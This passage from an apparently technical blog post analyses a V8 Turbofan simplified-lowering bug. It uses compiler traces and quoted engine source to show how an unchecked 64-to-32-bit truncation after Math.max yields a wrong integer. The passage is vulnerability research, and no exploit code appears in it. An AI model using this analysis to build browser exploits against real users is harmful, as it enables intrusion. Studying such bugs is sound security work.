+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e">#52:NumberMax(#22:NumberConstant, #21:Phi)  [Static type: Range(0, 4294967295)] // Math.max</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span> visit <span style="color:#75715e">#52: NumberMax</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>  <span style="color:#f92672">==&gt;</span> output kRepWord64
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#75715e">#41:SpeculativeSafeIntegerSubtract[SignedSmall](#22:NumberConstant, #52:NumberMax, #23:Checkpoint, #18:Merge)  [Static type: Range(-4294967295, 0), Feedback type: Range(-2147483648, 0)]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span> visit <span style="color:#75715e">#41: SpeculativeSafeIntegerSubtract</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>   <span style="color:#f92672">==&gt;</span> output kRepWord32
+</span></span></code></pre></div><p>So far, so good nothing wrong with Turbofan optimization, let’s check the final phase of simplified lowering.</p>
+<p><strong>Step3: Lower Phase</strong></p>
+<p>Finally, in <strong>LOWER</strong>, each node is transformed into lower-level machine-specific nodes, with some nodes replaced, expanded, or removed as redundant. The <code>RepresentationChanger(src/compiler/representation-change.cc)</code> manages any necessary conversions to ensure each value uses the appropriate machine-level representation, completing the optimization. Let’s see how our Nodes from the previous Typed Lowering phase gets updated. Below fig 9 is unpatched and fig 10 is patched.</p>
+<ul>
+<li>
+<p>Notice that #68 #67 NumberConstant nodes are lowered to Float64Constant because #21 machine-representation is set to kRepFloat64 in previous phase</p>
+</li>
+<li>
+<p>NumberMax is completely removed and replaced with In64LessThan and Select[kRepWord64] which makes sense because. <strong>Importantly, notice that the LessThan and Select are both 64-bit which makes sense because our #52:NumberMax output representation is kRepWord64 so the lower instructions are chosen accordingly. This can be traced in the code.</strong></p>
+<ul>
+<li>Math.max can be done this way</li>
+<li>condition = Int64LessThan(a, b)</li>
+<li>// If &lsquo;condition&rsquo; is true (a &lt; b), Select chooses &lsquo;b&rsquo;. // If &lsquo;condition&rsquo; is false (a &gt;= b), Select chooses &lsquo;a&rsquo;.</li>
+<li>result = Select(condition, b, a);</li>
+</ul>
+</li>
+<li>
+<p>So far so good and it matches the patched version too.</p>
+</li>
+<li>
+<p><strong>The interesting part is that, in the unpatched version, the output of <code>#56:Select</code> is passed to <code>#72:TruncateInt64ToInt32</code>, while in the patched version, it’s passed to <code>#72:CheckedUInt64ToInt32</code>. This is critical because <code>TruncateInt64ToInt32</code> discards the upper 32 bits, whereas <code>CheckedUInt64ToInt32</code> performs an overflow check to prevent data loss. This vulnerable node allowed us to make the optimized output of <code>Math.max</code> produce <code>0x0000_0000_FFFF_FFFF</code> (Int64) and interpret it as <code>-1</code> (Int32, using 2’s complement representation of <code>0xFFFFFFFF</code>). We identified the exact node that caused the bug—let’s dive into the code to see what went wrong.</strong></p>
+</li>
+<li>
+<p>Also Notice for patched version the Int32 Sub has correct Range for Int32 Subtraction, but the unpatched version has incorrect Range for Int32 subtraction. It seems feedback_type is not updated to actual NodeProperties::SetType  (I couldn’t debug with source code on my shitty mac silicon d8)</p>
+<p><img src="/img/image4.png" alt="">         <br>
+Fig 9 Unpatched: Simplified Lowering</p>
+</li>
+</ul>
+<p><img src="/img/image2.png" alt="">
+Fig 10 Patched: Simplified Lowering</p>
+<p>The output of Lower Phase</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#f92672">--</span>{Lower phase}<span style="color:#f92672">--</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span> visit <span style="color:#75715e">#52: NumberMax  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  change: <span style="color:#75715e">#52:NumberMax(@0 #22:NumberConstant) from kRepTaggedSigned to kRepWord64:no-truncation (but distinguish zeros)  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  change: <span style="color:#75715e">#52:NumberMax(@1 #21:Phi) from kRepFloat64 to kRepWord64:no-truncation (but distinguish zeros)  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  visit <span style="color:#75715e">#41: SpeculativeSafeIntegerSubtract  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>     change: <span style="color:#75715e">#41:SpeculativeSafeIntegerSubtract(@0 #22:NumberConstant) from kRepTaggedSigned to kRepWord32:no-truncation (but distinguish zeros)  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      change: <span style="color:#75715e">#41:SpeculativeSafeIntegerSubtract(@1 #52:Select) from kRepWord64 to kRepWord32:no-truncation (but identify zeros)  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  visit <span style="color:#75715e">#42: Return  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  change: <span style="color:#75715e">#42:Return(@0 #22:NumberConstant) from kRepTaggedSigned to kRepWord32:truncate-to-word32  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  change: <span style="color:#75715e">#42:Return(@1 #41:Int32Sub) from kRepWord32 to kRepTagged:no-truncation (but distinguish zeros)  </span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span> visit <span style="color:#75715e">#43: End</span>
+</span></span></code></pre></div><p><strong>Lowering Phase Source Code Flow</strong></p>
+<p>The VisitNode enters switch for #41:SpeculativeSafeIntegerSubtract[1] just like the previous ReType phase. The left and right operands are used for SpeculativeSafeIntegerSubtract with UseInfo [3] kWord32, kSignedSmall typecheck. And inside the VisitBinop left and right[5] operand UseInfo are passed to ProcessInput separately.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span> <span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>Phase T<span style="color:#f92672">&gt;</span>   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e">// visit #26: SpeculativeSafeIntegerSubtract  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#75715e"></span> <span style="color:#66d9ef">void</span> VisitSpeculativeIntegerAdditiveOp(Node<span style="color:#f92672">*</span> node, Truncation truncation,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>                                        SimplifiedLowering<span style="color:#f92672">*</span> lowering) { [<span style="color:#ae81ff">1</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>   Type left_upper <span style="color:#f92672">=</span> GetUpperBound(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">0</span>));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>   Type right_upper <span style="color:#f92672">=</span> GetUpperBound(node<span style="color:#f92672">-&gt;</span>InputAt(<span style="color:#ae81ff">1</span>));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>[...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="color:#75715e">// Try to use type feedback.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span><span style="color:#75715e"></span>   Type <span style="color:#66d9ef">const</span> restriction <span style="color:#f92672">=</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>       truncation.IsUsedAsWord32()<span style="color:#f92672">?</span> Type<span style="color:#f92672">::</span>Any()  <span style="color:#f92672">:</span> (truncation.identify_zeros() <span style="color:#f92672">==</span> kIdentifyZeros)  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>                 <span style="color:#f92672">?</span> Type<span style="color:#f92672">::</span>Signed32OrMinusZero()  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>                 <span style="color:#f92672">:</span> Type<span style="color:#f92672">::</span>Signed32(); [<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>   NumberOperationHint <span style="color:#66d9ef">const</span> hint <span style="color:#f92672">=</span> NumberOperationHint<span style="color:#f92672">::</span>kSignedSmall; <span style="color:#75715e">// [2]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span><span style="color:#75715e"></span>   DCHECK_EQ(hint, NumberOperationHintOf(node<span style="color:#f92672">-&gt;</span>op()));  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>     [...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#75715e">//UseInfo(MachineRepresentation::kWord32,   Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,   feedback);  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#75715e"></span>     UseInfo left_use <span style="color:#f92672">=</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>         CheckedUseInfoAsWord32FromHint(hint, left_identify_zeros); <span style="color:#75715e">// [3]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// For CheckedInt32Add and CheckedInt32Sub, we don&#39;t need to do  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// a minus zero check for the right hand side, since we already  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// know that the left hand side is a proper Signed32 value,  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#75715e"></span>     <span style="color:#75715e">// potentially guarded by a check.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span><span style="color:#75715e"></span>     TRACE(<span style="color:#e6db74">&#34;[checked] We  are second here %s&#34;</span>,node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>mnemonic());   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>     <span style="color:#75715e">//UseInfo(MachineRepresentation::kWord32,   Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,   feedback);  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span><span style="color:#75715e"></span>     UseInfo right_use <span style="color:#f92672">=</span> CheckedUseInfoAsWord32FromHint(hint, kIdentifyZeros); <span style="color:#75715e">// [4]  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span><span style="color:#75715e"></span>     VisitBinop<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, left_use, right_use, MachineRepresentation<span style="color:#f92672">::</span>kWord32,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>                   restriction);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>   }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>Phase T<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span> <span style="color:#66d9ef">void</span> VisitBinop(Node<span style="color:#f92672">*</span> node, UseInfo left_use, UseInfo right_use,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>                 MachineRepresentation output,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>                 Type restriction_type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Any()) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>   DCHECK_EQ(<span style="color:#ae81ff">2</span>, node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>ValueInputCount());  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>   ProcessInput<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, <span style="color:#ae81ff">0</span>, left_use); [<span style="color:#ae81ff">5</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>   ProcessInput<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, <span style="color:#ae81ff">1</span>, right_use); [<span style="color:#ae81ff">6</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>   <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; i <span style="color:#f92672">&lt;</span> node<span style="color:#f92672">-&gt;</span>InputCount(); i<span style="color:#f92672">++</span>) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span><span>     EnqueueInput<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, i);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span><span>   }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span><span>   SetOutput<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>(node, output, restriction_type);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span><span> }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span><span>The ProcesInput<span style="color:#f92672">&lt;</span>LOWER<span style="color:#f92672">&gt;</span> function calls the ConvertInput at [<span style="color:#ae81ff">1</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;&gt;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span><span><span style="color:#66d9ef">void</span> RepresentationSelector<span style="color:#f92672">::</span>ProcessInput<span style="color:#f92672">&lt;</span>LOWER<span style="color:#f92672">&gt;</span>(Node<span style="color:#f92672">*</span> node, <span style="color:#66d9ef">int</span> index,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span><span>                                                UseInfo use) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span><span> DCHECK_IMPLIES(use.type_check() <span style="color:#f92672">!=</span> TypeCheckKind<span style="color:#f92672">::</span>kNone,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span><span>                <span style="color:#f92672">!</span>node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>HasProperty(Operator<span style="color:#f92672">::</span>kNoDeopt) <span style="color:#f92672">&amp;&amp;</span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50</span><span>                    node<span style="color:#f92672">-&gt;</span>op()<span style="color:#f92672">-&gt;</span>EffectInputCount() <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51</span><span> ConvertInput(node, index, use); [<span style="color:#ae81ff">1</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span><span>}
+</span></span></code></pre></div><p>In the ConvertInput function each node is lowered/converted accordingly:</p>
+<ul>
+<li><strong>For the input #14:NumberConstant</strong>  at  [1], its representation is stored in <em>input_rep</em>, which is the output representation info we figured in the Retype phase. For NumberConstant it is kRepTaggedSigned and use variable  consists of UseInfo for SpeculativeNumberLessThan. The input_type is Range(0,0). All these variables are passed to a call to GetRepresentationFor [3]</li>
+<li><strong>For the input #52:Select at [1],</strong> its representation is stored in input_rep, which is the output representation info we figured in the Retype phase. For Select it is  kRepWord64. But the UseInfo representation consists of kWord32 because that’s how it is speculated to be used in SpeculativeSafeIntegerSubtract:#41 node. The input_type is Range(0,0xFFFF_FFFF)(NumberMax output range). All these variables are passed to a call to GetRepresentationFor [3]</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:1;-o-tab-size:1;tab-size:1;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ConvertInput</span>(Node<span style="color:#f92672">*</span> node, <span style="color:#66d9ef">int</span> index, UseInfo use,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>                   Type input_type <span style="color:#f92672">=</span> Type<span style="color:#f92672">::</span>Invalid()) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   <span style="color:#75715e">// In the change phase, insert a change before the use if necessary.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span> (use.representation() <span style="color:#f92672">==</span> MachineRepresentation<span style="color:#f92672">::</span>kNone)  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>     <span style="color:#66d9ef">return</span>;  <span style="color:#75715e">// No input requirement on the use.  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span><span style="color:#75715e"></span>   Node<span style="color:#f92672">*</span> input <span style="color:#f92672">=</span> node<span style="color:#f92672">-&gt;</span>InputAt(index); [<span style="color:#ae81ff">1</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>   DCHECK_NOT_NULL(input);   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>   NodeInfo<span style="color:#f92672">*</span> input_info <span style="color:#f92672">=</span> GetInfo(input);   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>   MachineRepresentation input_rep <span style="color:#f92672">=</span> input_info<span style="color:#f92672">-&gt;</span>representation(); [<span style="color:#ae81ff">2</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>   [...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>   <span style="color:#66d9ef">if</span> (input_type.IsInvalid()) {  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>       input_type <span style="color:#f92672">=</span> TypeOf(input);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>       TRACE(<span style="color:#e6db74">&#34;input_type %s&#34;</span>, input_type)  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>     }  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    [...]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>     Node<span style="color:#f92672">*</span> n <span style="color:#f92672">=</span> changer_<span style="color:#f92672">-&gt;</span>GetRepresentationFor(input, input_rep, input_type,  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>                                              node, use); [<span style="color:#ae81ff">3</span>]  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span><span style="color:#75715e">//input=Select, input_rep=kRepWord64, inpute_type=Range(0,0xFFFF_FFFF), node=SpeculativeNumberLessThan  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span><span style="color:#75715e">//use=UseInfo(MachineRepresentation::kWord32, Truncation::Any(identify_zeros), TypeCheckKind::kSignedSmall,  
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span><span style="color:#75715e"></span>    node<span style="color:#f92672">-&gt;</span>ReplaceInput(index, n);  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>   }  
